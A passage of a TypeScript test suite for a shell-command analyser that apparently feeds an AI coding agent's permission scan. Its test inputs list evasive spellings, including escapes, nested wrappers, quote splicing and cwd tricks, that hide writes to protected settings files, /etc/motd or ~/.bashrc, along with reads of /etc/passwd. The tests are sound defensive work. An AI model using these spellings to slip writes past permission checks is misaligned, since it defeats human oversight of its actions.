  // which is exactly where a protected settings file lives. Attributing the
  // write to the `cd` target instead would check the wrong path.
  it.each([
    ['cd /tmp & echo {} > settings.json'],
    ['cd .qwen & echo {} > settings.json'],
  ])('does not move the cwd for the backgrounded `cd` in %s', (command) => {
    expect(across(command)).toEqual([write('/repo/settings.json')]);
  });

  it.each(['pushd', 'pushd +2', 'pushd -2', 'pushd -n /tmp'])(
    'marks writes after `%s` as cwd-unknown',
    (command) => {
      expect(across(`${command} && printf '{}' > settings.local.json`)).toEqual(
        [uncertainWrite('/repo/settings.local.json')],
      );
    },
  );

  it('does not mark absolute writes after dynamic `cd` as cwd-dependent', () => {
    for (const command of [
      'cd "$QWEN_HOME" && echo hi > /tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi 1>/tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi >&/tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi 1>&/tmp/out.txt',
      // `>|` is the same write as `>`, so it must reach the same verdict: the
      // bare `>` alternative matched first here and left `|/tmp/out.txt`
      // behind, which is not shell-absolute, so this form alone came out
      // `pathMayDependOnCwd: true`.
      'cd "$QWEN_HOME" && echo hi >|/tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi 1>|/tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi 2>|/tmp/out.txt',
    ]) {
      expect(across(command)).toEqual([uncertainWrite('/tmp/out.txt', false)]);
    }
    expect(across('cd "$QWEN_HOME" && cat <&/tmp/in.txt')).toEqual([
      {
        virtualTool: 'read_file',
        filePath: '/tmp/in.txt',
        cwdUnknown: true,
        pathMayDependOnCwd: false,
      },
    ]);
    // A quoted `&` is part of a relative name: `&/tmp/out.txt` in the cwd.
    expect(across('cd "$QWEN_HOME" && echo hi >"&"/tmp/out.txt')).toEqual([
      uncertainWrite('/repo/&/tmp/out.txt'),
    ]);
  });

  it('falls back gracefully on excessively deep wrapper nesting', () => {
    // A pathological chain hits MAX_SHELL_UNWRAP_DEPTH (4) and the remainder
    // is analysed as-is instead of recursing forever. The result does not
    // matter, only that the call returns without throwing or hanging.
    const deep = 'bash -lc "bash -lc \\"bash -lc \'bash -lc echo > x.txt\'\\""';
    expect(() => across(deep)).not.toThrow();
  });
});

describe('line continuations before a `$` construct', () => {
  it('reads the ANSI-C word the continuation interrupts', () => {
    // The shell removes `\`+newline before it lexes, so the ANSI-C opener it
    // interrupts is the word bash runs; `$` + continuation + `'` is not a
    // dangling `$` followed by an unrelated quoted word.
    const literal = ops("mv /tmp/a $'/tmp/protected/x'");
    expect(literal).not.toEqual([]);
    expect(ops("mv /tmp/a $\\\n'/tmp/protected/x'")).toEqual(literal);
  });
});

describe('ANSI-C words ending in a literal trailing \\c', () => {
  it('keeps the redirect visible after the word', () => {
    expect(
      extractShellOperationsAcrossCommand("echo $'a\\c' > /etc/motd", '/repo'),
    ).toEqual([write('/etc/motd')]);
  });

  it('keeps later operands visible after the word', () => {
    const ops = extractShellOperationsAcrossCommand(
      "cat $'x\\c' /etc/passwd",
      '/tmp',
    );
    expect(ops.map((op) => op.filePath)).toContain('/etc/passwd');
  });
});

// A multi-unit ANSI-C escape appends one `bare` entry per UTF-16 unit of its
// decoded text, so positional syntax trimming stays aligned and the unquoted
// `)` after an astral filename is dropped, not kept in the path.
describe('ANSI-C astral escape keeps bare aligned with current', () => {
  it('trims the closing paren after a multi-unit escape', () => {
    expect(
      extractShellOperationsAcrossCommand("(cat > $'\\U0001F600')", '/repo'),
    ).toEqual([write('/repo/😀')]);
  });

  it('still trims after a single-unit escape', () => {
    expect(
      extractShellOperationsAcrossCommand("(cat > $'\\x41')", '/repo'),
    ).toEqual([write('/repo/A')]);
  });
});

// Invalid UTF-8 keeps one lone surrogate per byte: two different byte paths
// must never collapse into the same string.
describe('ANSI-C bytes that are not valid UTF-8', () => {
  it.each<[command: string, path: string]>([
    [String.raw`cat $'\xff'`, '/repo/\udcff'],
    [String.raw`cat $'\xc3'`, '/repo/\udcc3'],
    [String.raw`cat $'\uD800'`, '/repo/\udced\udca0\udc80'],
    [String.raw`cat $'\U00110000'`, '/repo/\udcf4\udc90\udc80\udc80'],
  ])(
    'keeps one character per byte but marks the path unresolved: %s',
    (command, path) => {
      expect(extractShellOperationsAcrossCommand(command, '/repo')).toEqual([
        { ...read(path), pathUnknown: true },
      ]);
    },
  );
  it('does not pair a raw lone high surrogate with a decoded invalid byte', () => {
    const command = 'cat \uD800' + String.raw`$'\xff'`;
    expect(extractShellOperations(command, '/repo')).toEqual([
      { ...read('/repo/\uDC00\uDCFF'), pathUnknown: true },
    ]);
  });

  it('does not pair a raw lone high surrogate across a wrapper byte boundary', () => {
    const command = "sh -c 'cat \uD800'" + String.raw`$'\xff'`;
    expect(extractShellOperationsAcrossCommand(command, '/repo')).toEqual([
      { ...read('/repo/\uDC00\uDCFF'), pathUnknown: true },
    ]);
  });

  it.each([
    [
      'a double-quoted wrapper payload',
      String.raw`bash -c "printf ok > $'\\xff'"`,
      'write_file',
    ],
    [
      'a double-quoted payload with an expansion',
      String.raw`bash -c "printf $VALUE > $'\\xff'"`,
      'write_file',
    ],
    [
      'a backslash between raw surrogate fragments',
      'cat ' + String.fromCharCode(0xd800, 0x5c, 0xdcff),
      'read_file',
    ],
    [
      'a hex-quoted wrapper payload',
      String.raw`sh -c $'printf ok > $\x27\xff\x27'`,
      'write_file',
    ],
    [
      'an octal-quoted wrapper payload',
      String.raw`sh -c $'printf ok > $\047\xff\047'`,
      'write_file',
    ],
    ['raw surrogates separated by quotes', "cat '\uD800'\uDCFF", 'read_file'],
    [
      'a raw redirect target separated by quotes',
      "printf ok > '\uD800'\uDCFF",
      'write_file',
    ],
  ])(
    'keeps an undecodable path unresolved through %s',
    (_label, command, tool) => {
      const operations = extractShellOperationsAcrossCommand(command, '/repo');
      expect(operations).toHaveLength(1);
      expect(operations[0]).toMatchObject({
        virtualTool: tool,
        pathUnknown: true,
      });
    },
  );

  it('marks a redirect-only undecodable target unresolved', () => {
    expect(extractShellOperations(String.raw`> $'\xff'`, '/repo')).toEqual([
      { ...write('/repo/\udcff'), pathUnknown: true },
    ]);
  });

  it('keeps an undecodable argument unresolved after .. normalization', () => {
    expect(
      extractShellOperationsAcrossCommand(
        String.raw`cat $'\xff'/../etc/passwd`,
        '/repo',
      ),
    ).toEqual([{ ...read('/repo/etc/passwd'), pathUnknown: true }]);
  });

  it('keeps later relative writes uncertain after an undecodable cd', () => {
    expect(
      extractShellOperationsAcrossCommand(
        String.raw`cd $'\xff'/../dir; cat > settings.json`,
        '/repo',
      ),
    ).toEqual([uncertainWrite('/repo/dir/settings.json')]);
  });

  it('keeps absolute-looking writes uncertain after an undecodable cd', () => {
    expect(
      extractShellOperationsAcrossCommand(
        String.raw`cd $'\xff'/..; cat > /repo/victim.txt`,
        '/repo',
      ),
    ).toEqual([uncertainWrite('/repo/victim.txt', false)]);
  });
});

describe('ANSI-C wrapper payloads', () => {
  it.each([
    [String.raw`cat $'\xc3\xa9'`, [read('/repo/é')]],
    [String.raw`cat $'\xc3'$'\xa9'`, [read('/repo/é')]],
    ["sh -c 'cat 😀'$'\\x41'", [read('/repo/😀A')]],
    [String.raw`cat \😀`, [read('/repo/😀')]],
    ["cat '😀'", [read('/repo/😀')]],
    [String.raw`cat $'a\c\\tb'`, [read('/repo/a\x1ctb')]],
    [String.raw`cat $'\c?'`, [read('/repo/\x7f')]],
    [String.raw`cat $'\x3e'/etc/passwd`, [read('/repo/>/etc/passwd')]],
    ['echo hi ">"/tmp/x', []],
    ["echo hi >'>'x/../settings.json", [write('/repo/settings.json')]],
  ] as const)(
    'keeps decoded bytes and operators distinct: %s',
    (command, expected) => {
      expect(across(command)).toEqual(expected);
    },
  );

  it.each(["cd $''", "cd ''"])(
    'keeps an empty cd argument uncertain: %s',
    (command) => {
      expect(across(`${command}; cat > settings.json`)).toEqual([
        uncertainWrite('/repo/settings.json'),
      ]);
    },
  );
  it('keeps a redirect after a continuation-split PID visible', () => {
    expect(across("cat $\\\n$'a\\' > /etc/motd")).toContainEqual(
      write('/etc/motd'),
    );
  });

  // The script word is the word the shell resolves: an ANSI-C, locale or
  // continuation-split payload carries the operations that run, so the write
  // inside it must reach the permission scan.
  it.each([
    ['an ANSI-C payload', "bash -c $'cat > /etc/motd'"],
    ['a locale payload', 'sh -c $"cat > /etc/motd"'],
    [
      'a continuation-split payload',
      String.raw`sh -c $\
'cat > /etc/motd'`,
    ],
    [
      'a terminator after a continuation',
      String.raw`sh -c $\
'--' 'cat > /etc/motd'`,
    ],
    ['a brace-expanded terminator', "sh -c {--,'cat > /etc/motd'}"],
  ])('extracts the write inside %s', (_what, command) => {
    expect(across(command)).toEqual([write('/etc/motd')]);
  });

  it('keeps a protected write visible beside an undecodable wrapper argument', () => {
    expect(
      across(String.raw`sh -c $'echo {} > .qwen/settings.json; cat \xff'`),
    ).toEqual([
      write(REPO_SETTINGS),
      { ...read('/repo/\udcff'), pathUnknown: true },
    ]);
  });

  it('extracts writes from a multi-word payload carrying an undecodable byte', () => {
    expect(
      across(String.raw`sh -c $'printf x > secrets/real_file \xff'`),
    ).toEqual([write('/repo/secrets/real_file')]);
  });

  it('treats a decoded operator as data, not a redirect', () => {
    // `$'\x3e'` decodes to `>` and is a `>` argument to `cat`: the read of
    // the file named `>` plus the real write, not a phantom write to `>`.
    expect(sorted(across(String.raw`cat $'\x3e' > /tmp/t`))).toEqual([
      read('/repo/>'),
      write('/tmp/t'),
    ]);
  });
});

describe('unresolved redirect targets', () => {
  it.each([
    String.raw`D=sub; sh -c "printf {} > \"$D\"/../.qwen/settings.json"`,
    String.raw`sh -c 'printf {} > "$OUTPUT"'`,
    String.raw`printf ok > "😀$OUT"/../.qwen/settings.json`,
    String.raw`printf ok > dir/"$OUT"`,
    String.raw`printf ok > "$(pwd)/out"`,
    'printf ok > `pwd`/out',
    String.raw`printf '>'>"$OUT"`,
    String.raw`cd sub > "$OUT"`,
  ])('keeps an expanding redirect visible: %s', (command) => {
    const operations = across(command);
    expect(operations).toHaveLength(1);
    expect(operations[0]).toMatchObject({
      virtualTool: 'write_file',
      pathUnknown: true,
    });
  });

  it.each(['>', '1>', '>>', '2>', '2>>', '&>', '&>>', '>|', '2>|', '<'])(
    'keeps an unresolved %s target in both token layouts',
    (operator) => {
      for (const space of ['', ' ']) {
        expect(across(`unknown-command ${operator}${space}"$OUT"`)).toEqual([
          {
            virtualTool: operator === '<' ? 'read_file' : 'write_file',
            filePath: '/repo/$OUT',
            pathUnknown: true,
          },
        ]);
      }
    },
  );

  it.each([
    [String.raw`'$OUT'`, '$OUT'],
    [String.raw`\$OUT`, '$OUT'],
    [String.raw`"\$OUT"`, '$OUT'],
    [String.raw`$'\x24OUT'`, '$OUT'],
    [String.raw`$'\x60OUT'`, '`OUT'],
    [String.raw`dir/'$OUT'`, 'dir/$OUT'],
    [String.raw`😀'$OUT'`, '😀$OUT'],
    [String.raw`'$OUT'/../.qwen/settings.json`, '.qwen/settings.json'],
  ])('keeps a literal target known: %s', (target, file) => {
    expect(across(`printf ok > ${target}`)).toEqual([write(`/repo/${file}`)]);
  });

  it.each([
    String.raw`printf "$VALUE" > .qwen/settings.json`,
    String.raw`printf "$VALUE>">.qwen/settings.json`,
  ])(
    'does not attribute argument expansion to a static redirect: %s',
    (command) => {
      expect(across(command)).toEqual([write(REPO_SETTINGS)]);
    },
  );
});

describe('quoted and decoded tilde targets', () => {
  // bash expands `~` only when it was typed unquoted. `cat > "~/x"` and
  // `cat > $'\x7e/x'` both decode to `~/x` and write under a literal directory
  // named `~`, so expanding them invented a path under $HOME that no rule can
  // match (#16075 review, R2-8).
  it.each([
    ['a quoted tilde', 'cat > "~/x"'],
    ['an empty quote before the tilde', 'cat > ""~/x'],
    ['an empty quote in the tilde prefix', 'cat > ~""/x'],
    ['a single-quoted tilde', "cat > '~/x'"],
    ['a backslash-escaped tilde', String.raw`cat > \~/x`],
  ])('does not expand %s in a redirect target', (_what, command) => {
    expect(across(command)).toEqual([write('/repo/~/x')]);
  });

  it('does not expand a decoded tilde', () => {
    expect(across(String.raw`cat > $'\x7e/x'`)).toEqual([write('/repo/~/x')]);
  });

  it('still expands an unquoted tilde', () => {
    const home = os.homedir().replace(/\\/g, '/');
    expect(across('cat > ~/x')).toEqual([write(`${home}/x`)]);
  });

  it('keeps a decoded cd target uncertain', () => {
    // `cd $'\x7e'` is the literal `~` directory and may not exist at all, so
    // the rest of the segment runs in a cwd the analysis cannot know.
    expect(across(String.raw`cd $'\x7e' ; cat > settings.json`)).toEqual([
      uncertainWrite('/repo/~/settings.json'),
    ]);
  });

  it.each([String.raw`$'\x7e'/x`, '"~"/x', String.raw`\~/x`])(
    'keeps a literal tilde prefix uncertain: %s',
    (target) => {
      expect(across(`cd ${target}; cat > settings.json`)).toEqual([
        uncertainWrite('/repo/~/x/settings.json'),
      ]);
    },
  );

  it('keeps an empty quote in a cd tilde prefix uncertain', () => {
    expect(across("cd ~''; cat > settings.json")).toEqual([
      uncertainWrite('/repo/~/settings.json'),
    ]);
  });

  it('keeps a quoted cd target uncertain', () => {
    expect(across('cd "~/x" ; cat > y')).toEqual([
      uncertainWrite('/repo/~/x/y'),
    ]);
  });
});

describe('shell syntax ownership', () => {
  it.each<[string, ShellOperation]>([
    ['tee >(cat) .qwen/settings.json', write(REPO_SETTINGS)],
    ['tee $(printf source) .qwen/settings.json', write(REPO_SETTINGS)],
    ['cat <(printf x) .qwen/settings.json', read(REPO_SETTINGS)],
    ['cp $(printf source) .qwen/settings.json', write(REPO_SETTINGS)],
  ])('keeps the operand after a word substitution: %s', (command, expected) => {
    expect(across(command)).toContainEqual(expected);
  });

  it.each(['!(', "'", '"'])(
    'ignores group syntax in a comment: %s',
    (comment) => {
      expect(across(`cd .qwen # ${comment}\nprintf x > settings.json`)).toEqual(
        [write(REPO_SETTINGS)],
      );
    },
  );

  it('does not treat a quote-spliced case command as a keyword', () => {
    expect(across("ca''se; printf x > marker")).toEqual([
      write('/repo/marker'),
    ]);
  });

  it('does not execute the elements of an array assignment', () => {
    expect(across('args=(tee .qwen/settings.json)')).toEqual([]);
  });

  it('does not certify cwd across an unmodelled case arm', () => {
    expect(
      across('case x in x) cd .qwen;; esac; printf x > settings.json'),
    ).toEqual([
      expect.objectContaining({
        virtualTool: 'write_file',
        cwdUnknown: true,
        pathMayDependOnCwd: true,
      }),
    ]);
  });

  it.each(["'-p'", '"-p"', String.raw`\-p`, "-''p", "$'-p'", "'--'"])(
    'does not treat a quoted time option as syntax: %s',
    (option) => {
      expect(
        across(`time ${option} cd .qwen; printf x > settings.json`),
      ).toEqual([write('/repo/settings.json')]);
    },
  );
});

describe('short option value ownership', () => {
  it.each(['cp', 'mv', 'install', 'ln'])(
    'does not reinterpret %s suffix text as a target directory',
    (command) => {
      for (const suffix of ['-S.tmp', '-St', '-bS.t']) {
        expect(across(`${command} ${suffix} a b`)).toContainEqual(
          write('/repo/b'),
        );
      }
    },
  );

  it('keeps the destination after an option value within a cluster', () => {
    expect(across('cp -rS.tmp a b')).toContainEqual(write('/repo/b'));
  });

  it.each(['-S -t', '-rS -t', '--suffix -t'])(
    'does not reinterpret the next suffix operand as a target flag: %s',
    (option) => {
      expect(across(`cp ${option} a b`)).toContainEqual(write('/repo/b'));
    },
  );

  it.each([
    'cp -Zt .qwen /tmp/payload',
    'cp --backup -t .qwen /tmp/payload',
    'cp --copy-contents -t .qwen /tmp/payload',
    'mv -Zt .qwen /tmp/payload',
    'install -Ct .qwen /tmp/payload',
    'ln -bt .qwen /tmp/payload',
  ])('keeps boolean flags from consuming a target option: %s', (command) => {
    const source = command.startsWith('mv ')
      ? edit('/tmp/payload')
      : read('/tmp/payload');
    expect(across(command)).toEqual([source, write('/repo/.qwen/payload')]);
  });

  it('keeps the real target-directory cluster precise', () => {
    expect(across('cp -rt .qwen /tmp/payload')).toEqual([
      read('/tmp/payload'),
      write('/repo/.qwen/payload'),
    ]);
  });
});

describe('prefixed directory changes', () => {
  it.each([
    'A=1',
    'A="a b"',
    'A+=1',
    'A[0]=1',
    'command',
    'command -p',
    'command --',
    'builtin',
    'builtin --',
    'A=1 command',
    'time',
    'time -p',
  ])('tracks the current shell directory through %s cd', (prefix) => {
    expect(across(`${prefix} cd .qwen && printf '{}' > settings.json`)).toEqual(
      [write(REPO_SETTINGS)],
    );
  });

  it.each(['A=1', 'command', 'builtin'])(
    'keeps argument marks aligned after %s',
    (prefix) => {
      expect(
        across(`${prefix} cd $'\\x7e'; printf '{}' > settings.json`),
      ).toEqual([uncertainWrite('/repo/~/settings.json')]);
    },
  );

  it.each(['command -v cd', 'command -V cd'])(
    'does not treat command lookup as a directory change: %s',
    (command) => {
      expect(across(`${command}; printf '{}' > settings.json`)).toEqual([
        write('/repo/settings.json'),
      ]);
    },
  );

  it.each(['A=1 time cd .qwen', 'command time cd .qwen'])(
    'does not treat a non-executed time prefix as a directory change: %s',
    (command) => {
      expect(across(`${command}; printf '{}' > settings.json`)).toEqual([
        write('/repo/settings.json'),
      ]);
    },
  );

  it.each(["'time'", '"time"', String.raw`\time`, "$'time'", "ti''me"])(
    'does not treat a non-reserved time spelling as a directory change: %s',
    (prefix) => {
      expect(across(`${prefix} cd .qwen; printf '{}' > settings.json`)).toEqual(
        [write('/repo/settings.json')],
      );
    },
  );

  it.each([
    'time -- cd .qwen',
    'time -p -- cd .qwen',
    'time time cd .qwen',
    'time -p time cd .qwen',
  ])('does not certify a version-dependent time cwd: %s', (command) => {
    expect(across(`${command}; printf '{}' > settings.json`)).toEqual([
      {
        ...write('/repo/settings.json'),
        cwdUnknown: true,
        pathMayDependOnCwd: true,
      },
    ]);
  });
});

describe('compound process cwd scopes', () => {
  it.each(["'f'()", "f''()", "'f name'()", "function 'f'", 'f-name()'])(
    'keeps a quoted or non-identifier function definition local: %s',
    (header) => {
      expect(across(`${header} { cd .qwen; }; printf x > outer`)).toEqual([
        write('/repo/outer'),
      ]);
    },
  );

  it.each<Row>([
    [
      'function definition body',
      'f() { cd .qwen; }; printf x > outer',
      [write('/repo/outer')],
    ],
    [
      'keyword function definition body',
      'function f { cd .qwen; }; printf x > outer',
      [write('/repo/outer')],
    ],
    [
      'spaced function definition header',
      'f ( ) { cd .qwen; }; printf x > outer',
      [write('/repo/outer')],
    ],
    [
      'function definition with a subshell body',
      'f() (cd .qwen); printf x > outer',
      [write('/repo/outer')],
    ],
    [
      'function containing a case arm',
      'f() { case x in x) printf x; cd .qwen;; esac; }; printf x > outer',
      [write('/repo/outer')],
    ],
    [
      'subshell',
      '(command cd .qwen); printf x > outer',
      [write('/repo/outer')],
    ],
    [
      'subshell body',
      '(command cd .qwen; printf x > inner); printf x > outer',
      [write('/repo/.qwen/inner'), write('/repo/outer')],
    ],
    [
      'nested subshells',
      '(cd .qwen; (cd nested; printf x > inner); printf x > middle); printf x > outer',
      [
        write('/repo/.qwen/nested/inner'),
        write('/repo/.qwen/middle'),
        write('/repo/outer'),
      ],
    ],
    [
      'pipeline left',
      'A=1 cd .qwen | cat; printf x > outer',
      [write('/repo/outer')],
    ],
    [
      'pipeline right',
      'printf x | command cd .qwen; printf x > outer',
      [uncertainWrite('/repo/outer')],
    ],
    [
      'pipeline brace body',
      '{ cd .qwen; printf x > inner; } | cat; printf x > outer',
      [write('/repo/.qwen/inner'), write('/repo/outer')],
    ],
    [
      'foreground brace body',
      '{ command cd .qwen; printf x > inner; }; printf x > outer',
      [write('/repo/.qwen/inner'), write('/repo/.qwen/outer')],
    ],
    [
      'background brace body',
      '{ command cd .qwen; printf x > inner; } & wait; printf x > outer',
      [write('/repo/.qwen/inner'), write('/repo/outer')],
    ],
    [
      'background conditional list',
      'cd .qwen && printf x > inner & wait; printf x > outer',
      [write('/repo/.qwen/inner'), write('/repo/outer')],
    ],
    [
      'brace group redirect',
      '{ cd .qwen; printf x > inner; } > before; printf x > outer',
      [
        write('/repo/before'),
        write('/repo/.qwen/inner'),
        write('/repo/.qwen/outer'),
      ],
    ],
    [
      'subshell group redirect',
      '(cd .qwen; printf x > inner) > before; printf x > outer',
      [write('/repo/before'), write('/repo/.qwen/inner'), write('/repo/outer')],
    ],
  ])('keeps %s cwd ownership', (_title, command, expected) => {
    expect(across(command)).toEqual(expected);
  });

  it('keeps over-budget group paths uncertain', () => {
    const command = '( '.repeat(101) + 'printf x > marker' + ' )'.repeat(101);
    expect(across(command)).toEqual([
      { ...uncertainWrite('/repo/marker'), pathUnknown: true },
    ]);
  });
});

describe('wrapper payload expansion', () => {
  it.each([
    String.raw`bash -c "printf x > '$D'settings.json"`,
    String.raw`bash -c "printf x > '$D''settings.json'"`,
    String.raw`bash -c "printf x > '$D'\settings.json"`,
  ])('does not certify a quote-spliced outer expansion: %s', (command) => {
    const writes = across(command).filter(
      (op) => op.virtualTool === 'write_file',
    );
    expect(writes).toHaveLength(1);
    expect(writes[0]!.pathUnknown).toBe(true);
  });

  it('keeps an outer expansion uncertain inside a quote-removed literal path', () => {
    const command = String.raw`bash -c "printf x > '$HOME/.bashrc'"' '`;
    expect(across(command)).toEqual([
      { ...write('/repo/$HOME/.bashrc'), pathUnknown: true },
    ]);
  });

  it('keeps operators visible after an expansion beside a produced backslash', () => {
    const command = String.raw`bash -c "cat \\$HOME"'; > ~/.bashrc'`;
    expect(across(command)).toContainEqual(
      write(`${os.homedir().replace(/\\/g, '/')}/.bashrc`),
    );
  });

  it.each([
    [String.raw`bash -c "printf x > '$'"`, '/repo/$'],
    [String.raw`bash -c "printf x > $'notes'"`, '/repo/notes'],
  ])('keeps non-expanding dollar syntax literal: %s', (command, path) => {
    expect(across(command)).toEqual([write(path)]);
  });

  it('does not mark a literal dollar path when only a different value expands', () => {
    const command = String.raw`bash -c "printf $VALUE > '\$OUT'"`;
    expect(across(command)).toEqual([write('/repo/$OUT')]);
  });
  it('does not match only a prefix of a literal variable name', () => {
    const command = String.raw`bash -c "printf $HOME > '\$HOMELESS'"`;
    expect(across(command)).toEqual([write('/repo/$HOMELESS')]);
  });

  it('does not leak wrapper expansion state into a later analysis', () => {
    across(String.raw`bash -c "printf x > '$HOME/.bashrc'"' '`);
    expect(across(String.raw`printf x > '$HOME/.bashrc'`)).toEqual([
      write('/repo/$HOME/.bashrc'),
    ]);
  });

  it('keeps an escaped expansion uncertain through coalesced quote removal', () => {
    const writes = across(String.raw`sh -c "cat > \\$TARGET"`).filter(
      (op) => op.virtualTool === 'write_file',
    );
    expect(writes).toHaveLength(1);
    expect(writes[0]!.pathUnknown).toBe(true);
  });
});

describe('assignment syntax in directory changes', () => {
  it.each(["A[0'']=1", 'A["0"]=1', 'A[$I]=1', 'A[0]+=1'])(
    'tracks cd after an assignment with a subscript: %s',
    (prefix) => {
      expect(across(`${prefix} cd .qwen; printf x > settings.json`)).toEqual([
        write(REPO_SETTINGS),
      ]);
    },
  );

  it.each(["'A=1'", "'A'=1", String.raw`A\=1`, "A''=1", "''A=1", "$''A=1"])(
    'does not treat a quoted command word as an assignment: %s',
    (prefix) => {
      expect(
        across(`${prefix} cd /elsewhere; printf '{}' > .qwen/settings.json`),
      ).toEqual([write(REPO_SETTINGS)]);
    },
  );

  it.each([
    'HOME=. cd',
    'HOME+=. cd',
    'CDPATH=/elsewhere cd .qwen',
    'CDPATH+=/elsewhere cd .qwen',
  ])('does not guess a cwd affected by temporary variables: %s', (command) => {
    expect(across(`${command}; printf '{}' > .qwen/settings.json`)).toEqual([
      uncertainWrite(REPO_SETTINGS),
    ]);
  });
});

describe('find starting-point uncertainty', () => {
  it.each(['./$D', './*'])(
    'keeps the marks on a find starting point: %s',
    (target) => {
      expect(across(`find ${target} -name x`)).toEqual([
        { ...dir(`/repo/${target.slice(2)}`), pathUnknown: true },
      ]);
    },
  );

  it.each(['$D', '"$D"', '-H $D', '-L "$D"', '-P $D'])(
    'keeps a variable-only starting point: %s',
    (target) => {
      expect(across(`find ${target} -name x`)).toEqual([
        { ...dir('/repo/$D'), pathUnknown: true },
      ]);
    },
  );

  it('does not drop an unresolved starting point beside a literal one', () => {
    expect(across('find src $D -name x')).toEqual([
      dir('/repo/src'),
      { ...dir('/repo/$D'), pathUnknown: true },
    ]);
  });

  it('retains default and literal starting points', () => {
    expect(across('find -name x')).toEqual([dir('/repo')]);
    expect(across('find src -name x')).toEqual([dir('/repo/src')]);
    expect(across("find '$D' -name x")).toEqual([dir('/repo/$D')]);
    expect(across('find 123 -name x')).toEqual([dir('/repo/123')]);
  });
});

describe('output destinations that are not files', () => {
  it.each([
    'curl -o - https://example.com',
    'wget -O - https://example.com/f.gz',
    'wget -qO- https://example.com/f.gz',
  ])('does not invent a download write: %s', (command) => {
    expect(
      ops(command).filter((op) => op.virtualTool === 'write_file'),
    ).toEqual([]);
  });

  it('keeps a URL-shaped output value as the file curl actually writes', () => {
    expect(
      ops('curl -o https://example.com/out file:///etc/hosts'),
    ).toContainEqual(write(`${CWD}/https:/example.com/out`));
  });

  it('reads an output value attached inside a short-flag cluster', () => {
    expect(ops('wget -qO/tmp/file.gz https://example.com/f.gz')).toContainEqual(
      write('/tmp/file.gz'),
    );
  });

  it('does not invent a patch edit for stdout', () => {
    expect(
      ops('patch -o - input.patch').filter((op) => op.virtualTool === 'edit'),
    ).toEqual([edit(`${CWD}/input.patch`)]);
  });
});

describe('shell-expanded write paths', () => {
  it.each([
    "printf '{}' > .qwen/setting{s..s}.json",
    "printf '{}' > .qwen/settings.j@(son)",
    'touch .qwen/setting{s..s}.json',
    'sort -o $OUT in.txt',
    'sort --output=$OUT in.txt',
    'cp -t $D settings.json',
    'mv --target-directory=$D settings.json',
    'curl -o $OUT https://example.com',
    'wget -O $OUT https://example.com',
    'patch -o $OUT input.patch',
  ])('keeps the expanded destination uncertain: %s', (command) => {
    const uncertainWrites = across(command).filter(
      (op) =>
        (op.virtualTool === 'write_file' || op.virtualTool === 'edit') &&
        op.pathUnknown,
    );
    expect(uncertainWrites).toHaveLength(1);
  });

  it.each([
    ['.qwen/setting{s..s}.json', '/repo/.qwen/setting{s..s}.json'],
    ['.qwen/settings.j@(son)', '/repo/.qwen/settings.j@(son)'],
  ])('keeps a quoted expansion literal: %s', (target, path) => {
    expect(across(`printf '{}' > '${target}'`)).toEqual([write(path)]);
  });

  it('does not mistake an awk program for a brace-expanded filename', () => {
    expect(across("awk '{print $1}' f")).toEqual([read('/repo/f')]);
  });

  it('keeps a quoted output-flag value literal', () => {
    expect(across("sort -o '$OUT' in.txt")).toContainEqual(write('/repo/$OUT'));
  });
});

describe('argument marks survive the env-assignment strip', () => {
  // `tokens` and `bares` are index-parallel. Dropping a leading assignment from
  // only one of them gave every later argument the previous word's marks, so a
  // destination bash resolves at runtime was certified as a literal path.
  it.each(['cat dir/$OUT', 'X=1 cat dir/$OUT', 'X=1 Y=2 cat dir/$OUT'])(
    'keeps the expanded read uncertain: %s',
    (command) => {
      expect(ops(command)).toEqual([
        {
          virtualTool: 'read_file',
          filePath: `${CWD}/dir/$OUT`,
          pathUnknown: true,
        },
      ]);
    },
  );

  it.each(['cp dir/$OUT /tmp/y', 'X=1 cp dir/$OUT /tmp/y'])(
    'marks the expanded source and not the literal destination: %s',
    (command) => {
      expect(ops(command)).toEqual([
        {
          virtualTool: 'read_file',
          filePath: `${CWD}/dir/$OUT`,
          pathUnknown: true,
        },
        write('/tmp/y'),
      ]);
    },
  );

  it('leaves a fully literal prefixed command known', () => {
    expect(ops('X=1 cat /tmp/safe')).toEqual([read('/tmp/safe')]);
  });
});

describe('paths a handler derives from an argument stay uncertain', () => {
  // A flag value is a substring of its argument and a `-t` destination is a
  // join, so neither string is ever an element of `args`. Matching finished
  // paths against whole arguments dropped the mark for those spellings.
  it.each([
    'sort -o .qwen/$OUT in.txt',
    'sort -o.qwen/$OUT in.txt',
    'sort --output=.qwen/$OUT in.txt',
  ])('marks the output flag in every spelling: %s', (command) => {
    const writes = ops(command).filter((op) => op.virtualTool === 'write_file');
    expect(writes).toEqual([
      {
        virtualTool: 'write_file',
        filePath: `${CWD}/.qwen/$OUT`,
        pathUnknown: true,
      },
    ]);
  });

  it.each([
    ['curl -o.qwen/$OUT https://example.com', 'curl'],
    ['wget -O.qwen/$OUT https://example.com', 'wget'],
  ])('marks an attached download destination: %s', (command) => {
    const writes = ops(command).filter((op) => op.virtualTool === 'write_file');
    expect(writes).toEqual([
      {
        virtualTool: 'write_file',
        filePath: `${CWD}/.qwen/$OUT`,
        pathUnknown: true,
      },
    ]);
  });

  it.each([
    'cp -t out/$D file',
    'cp -tout/$D file',
    'cp --target-directory=out/$D file',
    'mv -t out/$D file',
    'install -t out/$D file',
  ])('marks a joined target-directory destination: %s', (command) => {
    const writes = ops(command).filter((op) => op.virtualTool === 'write_file');
    expect(writes).toEqual([
      {
        virtualTool: 'write_file',
        filePath: `${CWD}/out/$D/file`,
        pathUnknown: true,
      },
    ]);
  });

  it.each([
    ['cp -t out/x? file', `${CWD}/out/x?/file`],
    ['mv --target-directory=out/{a,b} f', `${CWD}/out/{a,b}/f`],
    ['cp -t out/$D/.. file', `${CWD}/out/file`],
    ['cp -t .qwe? settings.json', `${CWD}/.qwe?/settings.json`],
  ])(
    'retains target-directory uncertainty before path normalization: %s',
    (command, filePath) => {
      const writes = ops(command).filter(
        (op) => op.virtualTool === 'write_file',
      );
      expect(writes).toEqual([
        { virtualTool: 'write_file', filePath, pathUnknown: true },
      ]);
    },
  );

  it.each([
    'sort -o/tmp/safe in.txt',
    'sort -o /tmp/safe in.txt',
    'curl -o/tmp/safe https://example.com',
  ])('leaves a literal derived destination known: %s', (command) => {
    const writes = ops(command).filter((op) => op.virtualTool === 'write_file');
    expect(writes).toEqual([write('/tmp/safe')]);
  });

